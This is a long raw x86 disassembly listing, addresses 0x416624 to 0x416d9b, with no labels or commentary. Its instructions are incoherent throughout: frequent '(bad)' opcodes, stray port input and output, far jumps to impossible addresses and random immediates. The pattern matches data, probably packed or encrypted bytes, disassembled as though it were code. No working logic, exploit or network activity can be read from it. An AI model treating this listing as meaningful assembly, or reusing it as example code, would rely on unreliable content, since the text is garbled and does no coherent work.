  416624:	adc    eax,DWORD PTR [edi]
  416626:	cdq    
  416627:	xor    BYTE PTR [edx-0x1ff18c58],ch
  41662d:	push   eax
  41662e:	cli    
  41662f:	into   
  416630:	pop    ebx
  416631:	sbb    ecx,DWORD PTR [ecx]
  416633:	jmp    0x781383c7
  416638:	rcl    DWORD PTR [edi+0x7d],0x4
  41663c:	push   eax
  41663d:	xchg   esi,eax
  41663e:	fwait
  41663f:	add    ebp,eax
  416641:	leave  
  416642:	retf   
  416643:	push   ds
  416644:	pop    edx
  416645:	xchg   esp,eax
  416646:	push   es
  416647:	daa    
  416648:	stc    
  416649:	(bad)  
  41664a:	outs   dx,DWORD PTR ds:[esi]
  41664b:	push   eax
  41664c:	das    
  41664d:	rcl    esp,cl
  41664f:	sub    eax,0x3fc7e0ba
  416654:	pop    edi
  416655:	jae    0x41668d
  416657:	dec    ebp
  416658:	sub    esp,DWORD PTR [ebx+0x316d73e5]
  41665e:	mov    dl,0x58
  416660:	mov    ds:0x58cafc72,al
  416665:	sbb    sp,WORD PTR [edx-0x62]
  416669:	bswap  edi
  41666b:	ror    DWORD PTR [ecx-0x130bb781],cl
  416671:	les    ebp,FWORD PTR [edi+eax*4+0x317d984a]
  416678:	rcr    edi,1
  41667a:	daa    
  41667b:	cld    
  41667c:	or     eax,0x88bcce2
  416681:	sub    esp,ecx
  416683:	sub    ax,0x9cf1
  416687:	ss retf 0x710d
  41668b:	push   ecx
  41668c:	or     eax,0xd462806a
  416691:	leave  
  416692:	jmp    0xcdf7857
  416697:	mov    ebx,ebx
  416699:	mov    bl,0xb8
  41669b:	pop    ebp
  41669c:	ins    DWORD PTR es:[edi],dx
  41669d:	call   0x84fba05c
  4166a2:	imul   ebx,DWORD PTR [edi+0x7c],0xffffff90
  4166a6:	(bad)  
  4166a7:	(bad)  [ecx+0x6b520676]
  4166ad:	dec    eax
  4166ae:	mov    ds:0xb964eda8,eax
  4166b3:	pop    edi
  4166b4:	cmp    al,0x76
  4166b6:	xchg   esp,eax
  4166b7:	jns    0x41665d
  4166b9:	pop    ebx
  4166ba:	scas   al,BYTE PTR es:[edi]
  4166bb:	xor    BYTE PTR [ebx+0x1542e410],bh
  4166c1:	popf   
  4166c2:	add    BYTE PTR [edi+0x1e],0x66
  4166c6:	addr16 inc edi
  4166c8:	jmp    0x41672d
  4166ca:	and    esp,DWORD PTR [ebp-0x40]
  4166cd:	jo     0x416668
  4166cf:	retf   0xcb7a
  4166d2:	iret   
  4166d3:	jnp    0x416754
  4166d5:	into   
  4166d6:	outs   dx,DWORD PTR ds:[esi]
  4166d7:	xchg   ebx,eax
  4166d8:	jecxz  0x41668f
  4166da:	outs   dx,DWORD PTR ds:[esi]
  4166db:	jo     0x41674b
  4166dd:	jbe    0x416696
  4166df:	mov    edi,0x1ffe4f66
  4166e4:	adc    DWORD PTR [edx+0x5f9f2ce],0xdc0c4e1
  4166ee:	adc    DWORD PTR [ebx],esp
  4166f0:	mov    edx,0x1ef1dac2
  4166f5:	std    
  4166f6:	cdq    
  4166f7:	jns    0x416700
  4166f9:	or     al,0x87
  4166fb:	dec    ebp
  4166fc:	sub    BYTE PTR [edx],al
  4166fe:	fnstsw WORD PTR [ebp-0x4c]
  416701:	and    eax,ebx
  416703:	ins    DWORD PTR es:[edi],dx
  416704:	push   ebp
  416705:	dec    edx
  416706:	aas    
  416707:	shl    DWORD PTR [eax],cl
  416709:	clc    
  41670a:	mov    edx,0xdac0b3e0
  41670f:	das    
  416710:	add    al,0xe5
  416712:	retf   
  416713:	cld    
  416714:	outs   dx,BYTE PTR ds:[esi]
  416715:	xchg   BYTE PTR [edx+0x75f9c180],al
  41671b:	push   es
  41671c:	adc    al,0xd8
  41671e:	jb     0x41678e
  416720:	cmp    dl,BYTE PTR [ebx-0x2e]
  416723:	mov    esi,0x4bd6be49
  416728:	stos   DWORD PTR es:[edi],eax
  416729:	fwait
  41672a:	iret   
  41672b:	in     eax,0x9b
  41672d:	neg    DWORD PTR ds:0xbdca7ba5
  416733:	mov    bl,0x5a
  416735:	and    cl,0x4a
  416738:	mov    BYTE PTR [edx],dl
  41673a:	shl    BYTE PTR [ebp-0x137c985c],cl
  416740:	test   DWORD PTR [ecx],edi
  416742:	push   ecx
  416743:	out    0x8b,eax
  416745:	adc    bl,0xf1
  416748:	and    esi,DWORD PTR [eax+0x475a29ee]
  41674e:	jge    0x416722
  416750:	or     ch,BYTE PTR [edi]
  416752:	jo     0x41673f
  416754:	out    0xa1,al
  416756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416757:	aas    
  416758:	push   cs
  416759:	inc    edx
  41675a:	sbb    al,BYTE PTR [eax+0x7a]
  41675d:	cmp    bh,cl
  41675f:	fs add al,0xb
  416762:	ret    
  416763:	mov    dl,0xb3
  416765:	or     esi,ebp
  416767:	cs in  al,0x49
  41676a:	xchg   ebp,eax
  41676b:	jae    0x4167e6
  41676d:	push   eax
  41676e:	jmp    0xfc0f:0xf1c17a79
  416775:	(bad)  
  416776:	out    dx,al
  416777:	xchg   edx,eax
  416778:	sahf   
  416779:	shl    DWORD PTR [esi],0x83
  41677c:	adc    eax,0xf94ec861
  416781:	das    
  416782:	sub    BYTE PTR [edi],dl
  416784:	inc    ebp
  416785:	fwait
  416786:	mov    dh,0x26
  416788:	in     eax,dx
  416789:	mov    DWORD PTR [edx+0x5c],esp
  41678c:	dec    ebx
  41678d:	push   edi
  41678e:	mov    ecx,0x70dbda72
  416793:	inc    edi
  416794:	rcr    ebp,1
  416796:	test   bh,al
  416798:	dec    ebx
  416799:	dec    ecx
  41679a:	sbb    edi,DWORD PTR [esi]
  41679c:	fsubr  DWORD PTR [ecx]
  41679e:	test   esp,esi
  4167a0:	inc    ebx
  4167a1:	sub    BYTE PTR [eax-0x52],dh
  4167a4:	cmp    dh,BYTE PTR ss:[esi]
  4167a7:	jne    0x41679d
  4167a9:	sub    al,0xd0
  4167ab:	push   eax
  4167ac:	and    BYTE PTR [esi],0x4b
  4167af:	fdiv   st(7),st
  4167b1:	dec    edx
  4167b2:	arpl   WORD PTR [edx],cx
  4167b4:	enter  0x25ef,0xa8
  4167b8:	inc    edi
  4167b9:	push   esp
  4167ba:	or     al,0x6
  4167bc:	scas   eax,DWORD PTR es:[edi]
  4167bd:	ret    
  4167be:	jp     0x41682e
  4167c0:	mov    edx,0x9244df67
  4167c5:	ds xchg edi,eax
  4167c7:	scas   eax,DWORD PTR es:[edi]
  4167c8:	xacquire xchg BYTE PTR [eax-0x683692dc],ah
  4167cf:	pop    edx
  4167d0:	sbb    ah,BYTE PTR [edx+0x442fd25d]
  4167d6:	ins    BYTE PTR es:[edi],dx
  4167d7:	mov    ecx,0xb31fbb1
  4167dc:	xchg   ebx,eax
  4167dd:	and    al,0x2d
  4167df:	mov    edx,DWORD PTR [edi-0x3d1c7f4e]
  4167e5:	cmp    edi,DWORD PTR [eax-0x59]
  4167e8:	mov    ds:0x804170db,al
  4167ed:	or     ecx,DWORD PTR [ecx+ebp*2+0x7ab5e5e]
  4167f4:	inc    edx
  4167f5:	pop    eax
  4167f6:	(bad)  
  4167f7:	rcr    BYTE PTR [ebx+0x275bf538],cl
  4167fd:	addr16 pop ecx
  4167ff:	xlat   BYTE PTR ds:[ebx]
  416800:	xor    al,0x15
  416802:	sbb    al,al
  416804:	lock pop ds
  416806:	test   al,0xe0
  416808:	pop    ds
  416809:	push   ss
  41680a:	mov    DWORD PTR [edx+eax*1],eax
  41680d:	mov    ?,WORD PTR [esi+0x5c]
  416810:	pop    ss
  416811:	retf   
  416812:	sbb    al,0x5a
  416814:	adc    BYTE PTR [edi+ebp*8+0x5],al
  416818:	(bad)  
  416819:	pusha  
  41681a:	sar    edi,1
  41681c:	cwde   
  41681d:	sub    eax,0x1a32698f
  416822:	fbstp  TBYTE PTR [ebx]
  416824:	sahf   
  416825:	arpl   WORD PTR [ecx+0x69],si
  416828:	cmp    eax,0x5303e182
  41682d:	xor    dh,BYTE PTR [edx-0x5d4c5fb7]
  416833:	sub    bl,bh
  416835:	seto   BYTE PTR [ebx+0x457fffee]
  41683c:	jmp    0x416852
  41683e:	out    dx,eax
  41683f:	sbb    bh,BYTE PTR [ebx+0x4d]
  416842:	mov    bh,0x26
  416844:	add    ebp,eax
  416846:	and    BYTE PTR [esi],dl
  416848:	push   ecx
  416849:	daa    
  41684a:	dec    esi
  41684b:	mov    ebp,0x9e02f6fa
  416850:	cmp    eax,0x31c1a303
  416855:	xchg   esp,eax
  416856:	push   ebx
  416857:	mov    eax,ds:0xa18c8094
  41685c:	adc    dh,BYTE PTR [edx+0x66]
  41685f:	xor    cl,BYTE PTR [eax+eax*8-0x6]
  416863:	(bad)  [esi]
  416865:	ja     0x41686f
  416867:	push   ebx
  416868:	inc    esi
  416869:	ja     0x416890
  41686b:	in     al,dx
  41686c:	cld    
  41686d:	xlat   BYTE PTR ds:[ebx]
  41686e:	mov    ecx,0xb4f427ef
  416873:	pop    ss
  416874:	pop    ebp
  416875:	push   ebp
  416876:	ins    DWORD PTR es:[edi],dx
  416877:	mov    DWORD PTR [ebp-0x485a8305],esi
  41687d:	hlt    
  41687e:	les    edx,FWORD PTR [ecx+0x57]
  416881:	movhps QWORD PTR [ebp-0x65],xmm7
  416885:	retf   
  416886:	sub    eax,0xd90f300e
  41688b:	xchg   DWORD PTR [ecx+0x2a],ebx
  41688e:	clc    
  41688f:	nop
  416890:	mov    WORD PTR [edi],cs
  416892:	inc    eax
  416893:	jp     0x4168ce
  416895:	push   ebx
  416896:	ins    DWORD PTR es:[edi],dx
  416897:	(bad)  
  416898:	mov    ch,0x2
  41689a:	dec    ecx
  41689b:	fisub  WORD PTR [eax+0x3]
  41689e:	jo     0x4168f1
  4168a0:	enter  0xcc89,0x2b
  4168a4:	in     al,dx
  4168a5:	mov    eax,0x1feacb9d
  4168aa:	cld    
  4168ab:	mov    dl,0xee
  4168ad:	(bad)
  4168b1:	gs cs pop ebp
  4168b4:	repnz loop 0x4168f1
  4168b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168b8:	xor    esi,DWORD PTR cs:[esi+0x5b8241da]
  4168bf:	or     DWORD PTR [ebx],esi
  4168c1:	sub    eax,0xb24c9e58
  4168c6:	bound  ebp,QWORD PTR [esi+edi*2]
  4168c9:	push   0x56
  4168cb:	icebp  
  4168cc:	cmp    DWORD PTR ds:0x126401b8,esp
  4168d2:	or     ebx,esp
  4168d4:	(bad)  
  4168d5:	dec    ecx
  4168d6:	out    0xa9,al
  4168d8:	mov    al,0x67
  4168da:	adc    ecx,DWORD PTR es:[eax+0x3fbcb1a]
  4168e1:	aad    0xe6
  4168e3:	out    dx,eax
  4168e4:	pushf  
  4168e5:	push   es
  4168e6:	jb     0x416935
  4168e8:	(bad)
  4168eb:	xor    BYTE PTR [edi],bl
  4168ed:	enter  0xfd25,0x98
  4168f1:	cs scas al,BYTE PTR es:[edi]
  4168f3:	data16 scas al,BYTE PTR es:[edi]
  4168f5:	and    eax,edi
  4168f7:	and    ebp,DWORD PTR [si-0x6e]
  4168fb:	lahf   
  4168fc:	xor    eax,0xa17c42b3
  416901:	repz xor eax,0x554c22cc
  416907:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416908:	mov    bh,0x4
  41690a:	stos   DWORD PTR es:[edi],eax
  41690b:	dec    esp
  41690c:	and    ch,BYTE PTR [esi+0x481257ba]
  416912:	xor    al,0xce
  416914:	pop    eax
  416915:	stos   DWORD PTR es:[edi],eax
  416916:	push   ebp
  416917:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416918:	lds    edi,FWORD PTR [edx]
  41691a:	pusha  
  41691b:	xor    BYTE PTR [eax-0x2b],ah
  41691e:	cwde   
  41691f:	int3   
  416920:	nop
  416921:	dec    ecx
  416922:	arpl   WORD PTR [ecx-0x12],bx
  416925:	xor    al,cl
  416927:	je     0x41699e
  416929:	push   ds
  41692a:	jnp    0x416988
  41692c:	mov    bh,0x26
  41692e:	sbb    bl,BYTE PTR [edx+0x92e857c]
  416934:	repz push ds
  416936:	fwait
  416937:	pop    esp
  416938:	mov    bh,0x2c
  41693a:	add    bl,ah
  41693c:	stos   BYTE PTR es:[edi],al
  41693d:	jecxz  0x4168dd
  41693f:	ret    
  416940:	adc    DWORD PTR [edi+0x46],0xffffffc5
  416944:	stc    
  416945:	dec    esi
  416946:	mov    cl,0xbf
  416948:	pop    edi
  416949:	and    esi,DWORD PTR [eax+eax*1+0x37]
  41694d:	inc    ebp
  41694e:	jb     0x416911
  416950:	mov    al,ds:0x69eb8e72
  416955:	int3   
  416956:	retf   
  416957:	cdq    
  416958:	loope  0x416924
  41695a:	lahf   
  41695b:	and    DWORD PTR [esi],0xffffffeb
  41695e:	add    BYTE PTR [ebx+0x65b13525],dh
  416964:	cmp    edx,DWORD PTR [edx+0x46]
  416967:	ret    0x8c4d
  41696a:	adc    cl,bl
  41696c:	rol    BYTE PTR [ecx+0x54],cl
  41696f:	retf   0x2ab9
  416972:	inc    ecx
  416973:	sub    al,0x79
  416975:	hlt    
  416976:	mov    esp,0x5ed525b2
  41697b:	std    
  41697c:	mov    ah,0x1d
  41697e:	xlat   BYTE PTR ds:[ebx]
  41697f:	pop    edi
  416980:	lods   eax,DWORD PTR ds:[esi]
  416981:	popf   
  416982:	xor    BYTE PTR [esi],al
  416984:	xor    eax,0x2299d692
  416989:	add    DWORD PTR [edi+0x5],eax
  41698c:	outs   dx,BYTE PTR ds:[esi]
  41698d:	push   eax
  41698e:	pop    ebx
  41698f:	dec    ebx
  416990:	lods   al,BYTE PTR ds:[esi]
  416991:	sub    al,0xef
  416993:	sbb    al,0x12
  416995:	push   edi
  416996:	data16 xor ch,BYTE PTR [edx-0x6f]
  41699a:	out    dx,eax
  41699b:	push   ebx
  41699c:	sub    eax,ebx
  41699e:	test   al,0x69
  4169a0:	int3   
  4169a1:	fild   DWORD PTR [edi-0x3f]
  4169a4:	test   BYTE PTR [eax-0x59],0xb8
  4169a8:	mov    ebp,0x344f72f4
  4169ad:	rol    ebx,cl
  4169af:	sbb    DWORD PTR ds:0x2041707,ecx
  4169b5:	pusha  
  4169b6:	push   0xffffffa7
  4169b8:	inc    edi
  4169b9:	out    0xd0,eax
  4169bb:	es inc ebp
  4169bd:	in     al,dx
  4169be:	mov    al,bl
  4169c0:	xchg   ebx,eax
  4169c1:	ins    DWORD PTR es:[edi],dx
  4169c2:	lock dec edx
  4169c4:	mov    eax,0x316223c7
  4169c9:	imul   edx,DWORD PTR [esi-0x37f247ce],0xb7ccbf8e
  4169d3:	or     ch,dl
  4169d5:	das    
  4169d6:	add    eax,0xb23cd799
  4169db:	clc    
  4169dc:	sbb    dh,BYTE PTR [ebx]
  4169de:	(bad)  
  4169df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169e0:	xor    dl,0xc1
  4169e3:	pop    ebp
  4169e4:	adc    BYTE PTR [edi+0x5fa27481],dh
  4169ea:	jno    0x416a64
  4169ec:	ins    DWORD PTR es:[edi],dx
  4169ed:	enter  0x5c05,0x95
  4169f1:	out    0x38,eax
  4169f3:	scas   eax,DWORD PTR es:[edi]
  4169f4:	push   ecx
  4169f5:	inc    ebx
  4169f6:	mov    esi,0x3d6f9f0a
  4169fb:	or     ebp,esp
  4169fd:	fbstp  TBYTE PTR [ebx-0x75]
  416a00:	pop    edx
  416a01:	push   eax
  416a02:	pushf  
  416a03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a04:	mov    cl,0xb1
  416a06:	sahf   
  416a07:	push   ss
  416a08:	(bad)  
  416a09:	cmc    
  416a0a:	add    esp,ebx
  416a0c:	mov    ah,0x98
  416a0e:	mov    dl,cl
  416a10:	and    BYTE PTR [ecx+edi*2+0x44],dl
  416a14:	cld    
  416a15:	leave  
  416a16:	std    
  416a17:	lahf   
  416a18:	xor    al,0x25
  416a1a:	jp     0x416a3f
  416a1c:	sbb    DWORD PTR [esi+0x30439ba2],ecx
  416a22:	mov    al,ds:0xc6e63691
  416a27:	call   0x29e3de33
  416a2c:	fwait
  416a2d:	push   esp
  416a2e:	push   esi
  416a2f:	ja     0x416a36
  416a31:	adc    dl,bl
  416a33:	xor    eax,0xd902b0a
  416a38:	xchg   BYTE PTR [ebp+0x639dec55],ch
  416a3e:	aam    0xed
  416a40:	mov    bl,0xe4
  416a42:	scas   eax,DWORD PTR es:[edi]
  416a43:	into   
  416a44:	add    BYTE PTR [edi],ah
  416a46:	cmp    ebx,esi
  416a48:	mov    ebx,0x2f69ebb8
  416a4d:	add    BYTE PTR [edi+0x7],ch
  416a50:	aaa    
  416a51:	mov    DWORD PTR [edi+ebp*4+0x2c1fca55],esi
  416a58:	jno    0x416a18
  416a5a:	and    BYTE PTR ds:0xfd63fc64,dh
  416a60:	jbe    0x416ad4
  416a62:	fnstenv [edx-0x17]
  416a65:	jecxz  0x416a29
  416a67:	cmp    bh,al
  416a69:	mov    al,0xe
  416a6b:	fsubr  DWORD PTR [ebx]
  416a6d:	or     al,0x8f
  416a6f:	stos   DWORD PTR es:[edi],eax
  416a70:	icebp  
  416a71:	fisttp DWORD PTR [ecx+0x524b1a42]
  416a77:	push   ss
  416a78:	(bad)  
  416a7a:	jp     0x416a6d
  416a7c:	rcl    eax,cl
  416a7e:	cmp    BYTE PTR [ebx+0x583de93b],0x2b
  416a85:	jl     0x416a90
  416a87:	scas   eax,DWORD PTR es:[edi]
  416a88:	(bad)  
  416a89:	hlt    
  416a8a:	fidivr DWORD PTR [edi]
  416a8c:	shr    BYTE PTR [edx+ebx*1+0x28],1
  416a90:	outs   dx,BYTE PTR ds:[esi]
  416a91:	mov    BYTE PTR [ebp-0x6753f2f0],dh
  416a97:	bound  ebp,QWORD PTR [ecx+0x29]
  416a9a:	dec    esp
  416a9b:	fiadd  WORD PTR [ebx-0x3261a724]
  416aa1:	jmp    0x416a71
  416aa3:	sbb    DWORD PTR ss:[edi+0x52],0xffffffe1
  416aa8:	int3   
  416aa9:	mov    edx,0xb33b600b
  416aae:	push   cs
  416aaf:	fdiv   DWORD PTR [ecx+0xc]
  416ab2:	(bad)  
  416ab3:	xlat   BYTE PTR ds:[ebx]
  416ab4:	div    BYTE PTR [eax+0x40]
  416ab7:	xlat   BYTE PTR ds:[ebx]
  416ab8:	add    bh,0x60
  416abb:	xor    ecx,esp
  416abd:	sbb    eax,0x73153180
  416ac2:	daa    
  416ac3:	and    eax,0x680ee62
  416ac8:	cs pop ds
  416aca:	mov    eax,ds:0xa5025381
  416acf:	ss fdivp st(0),st
  416ad2:	out    dx,al
  416ad3:	jnp    0x416ae7
  416ad5:	dec    esp
  416ad6:	dec    edx
  416ad7:	test   DWORD PTR [ebp+ecx*1+0x57],esi
  416adb:	call   0xc93944c9
  416ae0:	push   ebp
  416ae1:	jno    0x416ae7
  416ae3:	and    BYTE PTR [ebx-0x46c5dca8],bl
  416ae9:	dec    ecx
  416aea:	(bad)  
  416aeb:	sbb    eax,0xa6d0edbc
  416af0:	inc    ebp
  416af1:	inc    ebp
  416af2:	jo     0x416b51
  416af4:	mov    al,ds:0xd5584396
  416af9:	stos   BYTE PTR es:[edi],al
  416afa:	push   ds
  416afb:	hlt    
  416afc:	pusha  
  416afd:	adc    cl,BYTE PTR ds:0xc7604171
  416b03:	aam    0x87
  416b05:	lods   al,BYTE PTR ds:[esi]
  416b06:	cmp    BYTE PTR ds:0xaf79509e,ch
  416b0c:	imul   ebx,DWORD PTR [ebx-0x43e81845],0xffffff9e
  416b13:	dec    edx
  416b14:	lahf   
  416b15:	in     eax,dx
  416b16:	xor    bl,ch
  416b18:	out    dx,al
  416b19:	xor    al,0x79
  416b1b:	mov    dh,0x86
  416b1d:	pop    edx
  416b1e:	div    BYTE PTR [ebx-0x68]
  416b21:	push   es
  416b22:	icebp  
  416b23:	xchg   ebx,eax
  416b24:	stos   DWORD PTR es:[edi],eax
  416b25:	mov    DWORD PTR [ecx],edx
  416b27:	ins    DWORD PTR es:[di],dx
  416b29:	in     al,0x14
  416b2b:	jne    0x416b70
  416b2d:	cmp    esi,DWORD PTR [ecx+0x49bb29]
  416b33:	shl    BYTE PTR [ecx-0x7bd74896],0x1
  416b3a:	ret    0xaf0e
  416b3d:	push   ss
  416b3e:	sbb    esp,DWORD PTR [esi+ebp*1+0x225323ee]
  416b45:	mov    esp,ebp
  416b47:	cmp    BYTE PTR [ebx-0x9],cl
  416b4a:	mov    BYTE PTR [ecx],ch
  416b4c:	gs push ebx
  416b4e:	mov    bl,0x82
  416b50:	or     al,0x7e
  416b52:	xor    al,0xed
  416b54:	push   ds
  416b55:	pop    ebp
  416b56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b58:	pop    edi
  416b59:	pop    edi
  416b5a:	shr    al,1
  416b5c:	adc    esi,DWORD PTR [ebp-0x32ded8af]
  416b62:	adc    DWORD PTR fs:[edi-0x1d91f9cb],ecx
  416b69:	cld    
  416b6a:	sbb    ebx,DWORD PTR [edx]
  416b6c:	cld    
  416b6d:	(bad)
  416b70:	bound  esi,QWORD PTR [ebx]
  416b72:	imul   edi,eax,0xcc1d70ef
  416b78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b79:	mov    ?,WORD PTR [edx]
  416b7b:	mov    al,BYTE PTR [edx-0x2f609edd]
  416b81:	jmp    0x3dd:0x2a6e5de5
  416b88:	aam    0x37
  416b8a:	lds    eax,FWORD PTR [ebx]
  416b8c:	pop    es
  416b8d:	(bad)  
  416b8e:	cmp    bl,BYTE PTR [ecx+0x3907f354]
  416b94:	jno    0x416b7f
  416b96:	adc    al,0xc
  416b98:	xor    DWORD PTR [eax+0x45],0x98e2906e
  416b9f:	mov    ecx,DWORD PTR [eax]
  416ba1:	test   BYTE PTR [bp+si+0x257a],bl
  416ba6:	pop    es
  416ba7:	inc    eax
  416ba8:	mov    ecx,0x8c998b0d
  416bad:	pop    eax
  416bae:	aad    0x9a
  416bb0:	ja     0x416b7a
  416bb2:	test   DWORD PTR [edx+0x58aeafd7],eax
  416bb8:	cmp    ax,WORD PTR ds:0xf1aa3c7c
  416bbf:	shl    BYTE PTR [edi],cl
  416bc1:	pushf  
  416bc2:	cmp    BYTE PTR [ecx],0x21
  416bc5:	jg     0x416bec
  416bc7:	push   eax
  416bc8:	xor    edx,DWORD PTR [ecx+0x65]
  416bcb:	scas   al,BYTE PTR es:[edi]
  416bcc:	cld    
  416bcd:	or     bh,BYTE PTR [ebx+eax*4]
  416bd0:	lock push eax
  416bd2:	xor    BYTE PTR [esi-0x3dfb0ce5],cl
  416bd8:	(bad)  
  416bda:	ins    BYTE PTR es:[edi],dx
  416bdb:	leave  
  416bdc:	adc    ecx,DWORD PTR [eax+0x241c2999]
  416be2:	sbb    BYTE PTR [ebx+0xb6b704f],ch
  416be8:	cs iret 
  416bea:	(bad)  
  416beb:	xlat   BYTE PTR ds:[ebx]
  416bec:	out    dx,al
  416bed:	mov    al,ds:0x34fee504
  416bf2:	add    al,0x17
  416bf4:	inc    eax
  416bf5:	ds out 0x5,al
  416bf8:	push   edx
  416bf9:	dec    ebp
  416bfa:	gs cmp eax,0x8e1df605
  416c00:	mov    dl,0x9c
  416c02:	(bad)  
  416c03:	out    dx,eax
  416c04:	xor    BYTE PTR [eax],0x71
  416c07:	and    DWORD PTR ds:0xf74bb62c,ebx
  416c0d:	jae    0x416bfb
  416c0f:	cmp    ebp,DWORD PTR [esp+ebx*2-0x48b7a4cc]
  416c16:	sti    
  416c17:	push   edi
  416c18:	jbe    0x416bde
  416c1a:	(bad)  
  416c1c:	sahf   
  416c1d:	push   edi
  416c1e:	inc    esi
  416c1f:	adc    esi,DWORD PTR [ebx]
  416c21:	xlat   BYTE PTR ds:[ebx]
  416c22:	(bad)  
  416c23:	sti    
  416c24:	pop    esi
  416c25:	aad    0x12
  416c27:	cmp    BYTE PTR [ecx],0x53
  416c2a:	or     edx,ebp
  416c2c:	mov    ebx,0xe6314cc9
  416c31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c32:	inc    eax
  416c33:	pop    edi
  416c34:	shl    dh,1
  416c36:	in     al,dx
  416c37:	xor    eax,0xfe9a5a91
  416c3c:	test   DWORD PTR [edx],eax
  416c3e:	sar    DWORD PTR fs:[ebp-0x76],1
  416c42:	jle    0x416c68
  416c44:	cmc    
  416c45:	outs   dx,BYTE PTR ds:[esi]
  416c46:	dec    ebx
  416c47:	add    DWORD PTR [ebp+0x134aabae],esi
  416c4d:	pop    ecx
  416c4e:	arpl   WORD PTR [ecx+edx*4+0x2f],si
  416c52:	and    edx,DWORD PTR [edi+0x6d]
  416c55:	fnstenv [eax+ecx*1+0x1c863918]
  416c5c:	pop    esi
  416c5d:	or     eax,0xa83dacd2
  416c62:	mov    ds:0x44a22c0d,eax
  416c67:	daa    
  416c68:	fimul  DWORD PTR [edi]
  416c6a:	movq   mm1,QWORD PTR [ebp-0x5d789f2f]
  416c71:	cmp    eax,0x4429a8f3
  416c76:	or     dh,BYTE PTR [ebx+0x56dad5cd]
  416c7c:	out    0x3,eax
  416c7e:	int3   
  416c7f:	daa    
  416c80:	sahf   
  416c81:	out    0x2b,eax
  416c83:	jg     0x416ccd
  416c85:	pusha  
  416c86:	adc    edi,0xffffffa0
  416c89:	out    0x4b,al
  416c8b:	shr    DWORD PTR [ebx+0x7b],1
  416c8e:	or     bh,BYTE PTR [eax]
  416c90:	stc    
  416c91:	push   cs
  416c92:	popa   
  416c93:	dec    esp
  416c94:	movzx  ecx,WORD PTR [ebx+0x7e]
  416c98:	dec    edi
  416c99:	std    
  416c9a:	dec    esp
  416c9b:	dec    ebp
  416c9c:	cli    
  416c9d:	mov    bh,0xf3
  416c9f:	cmp    BYTE PTR [ebp+0x41ec67c5],0xc9
  416ca6:	xchg   DWORD PTR [esi],ebp
  416ca8:	dec    ebx
  416ca9:	call   0x185d17c3
  416cae:	dec    esp
  416caf:	test   DWORD PTR [edx+0x712ba221],edx
  416cb5:	js     0x416d1e
  416cb7:	stos   BYTE PTR es:[edi],al
  416cb8:	adc    ebp,DWORD PTR [eax-0x4d]
  416cbb:	bound  esi,QWORD PTR [ebp+0x12]
  416cbe:	retf   
  416cbf:	inc    eax
  416cc0:	add    BYTE PTR [eax-0x52],ah
  416cc3:	aas    
  416cc4:	xchg   esi,eax
  416cc5:	pushf  
  416cc6:	aad    0x7a
  416cc8:	aam    0xb9
  416cca:	and    dl,BYTE PTR [edi-0x53]
  416ccd:	sbb    ebp,DWORD PTR gs:[ecx]
  416cd0:	xor    al,0xb6
  416cd2:	into   
  416cd3:	jmp    ecx
  416cd5:	push   ebx
  416cd6:	dec    esi
  416cd7:	mov    gs,WORD PTR [edx+ebp*2+0x420361dd]
  416cde:	and    al,0x68
  416ce0:	add    ch,BYTE PTR [esi+0x6ab82d10]
  416ce6:	out    dx,al
  416ce7:	adc    DWORD PTR [eax-0x2ed89678],ebx
  416ced:	je     0x416cac
  416cef:	cmpxchg8b QWORD PTR [edx-0x2e185b1a]
  416cf6:	push   ecx
  416cf7:	pop    DWORD PTR [ecx-0x82182c0]
  416cfd:	fild   WORD PTR [ebp+0x20]
  416d00:	int3   
  416d01:	loope  0x416d13
  416d03:	jne    0x416d07
  416d05:	fnstsw WORD PTR fs:[ebx-0x1aa5bd90]
  416d0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d0d:	repz mov ebp,0x5e302b7c
  416d13:	jo     0x416d8c
  416d15:	jle    0x416d73
  416d17:	inc    ebp
  416d18:	in     al,dx
  416d19:	mov    dl,0xb1
  416d1b:	das    
  416d1c:	ins    BYTE PTR es:[edi],dx
  416d1d:	mov    ss,WORD PTR [eax+0x7f]
  416d20:	lea    ebp,[ebx-0x795738f1]
  416d26:	push   ebp
  416d27:	aaa    
  416d28:	jno    0x416d97
  416d2a:	ins    BYTE PTR es:[edi],dx
  416d2b:	pop    esp
  416d2c:	cdq    
  416d2d:	std    
  416d2e:	leave  
  416d2f:	imul   edx,DWORD PTR [esi-0x26],0xffffffe0
  416d33:	pop    ebx
  416d34:	and    al,0x53
  416d36:	xor    DWORD PTR [ebx],0xe444f0af
  416d3c:	adc    BYTE PTR [ebx+esi*2-0x22],ch
  416d40:	data16 jg 0x416d3a
  416d43:	out    0x16,al
  416d45:	imul   eax,DWORD PTR [ebx-0x3],0x888187d8
  416d4c:	hlt    
  416d4d:	push   edx
  416d4e:	sub    al,ah
  416d50:	test   BYTE PTR [edi+0x7b],bl
  416d53:	inc    edx
  416d54:	aas    
  416d55:	ja     0x416d71
  416d57:	outs   dx,DWORD PTR ds:[esi]
  416d58:	xchg   edx,eax
  416d59:	pop    ebp
  416d5a:	mov    edi,0x463bba96
  416d5f:	xchg   ecx,eax
  416d60:	test   eax,0xe0075bd2
  416d65:	jnp    0x416cfe
  416d67:	sbb    DWORD PTR [edx-0x39],esi
  416d6a:	push   ss
  416d6b:	mov    al,ds:0x4f4061f8
  416d70:	mov    eax,ds:0x616633b0
  416d75:	into   
  416d76:	and    dh,dl
  416d78:	ds inc ebx
  416d7a:	push   0xb48d6d73
  416d7f:	fs pop esp
  416d81:	test   BYTE PTR [edx],0xcc
  416d84:	in     al,dx
  416d85:	test   BYTE PTR [edx-0x45108fb2],cl
  416d8b:	daa    
  416d8c:	pusha  
  416d8d:	sbb    DWORD PTR [ecx],esp
  416d8f:	inc    ebp
  416d90:	sub    DWORD PTR [edx+eax*1-0x65758df2],0xffffffeb
  416d98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d99:	cmp    al,0xb
  416d9b:	inc    edx
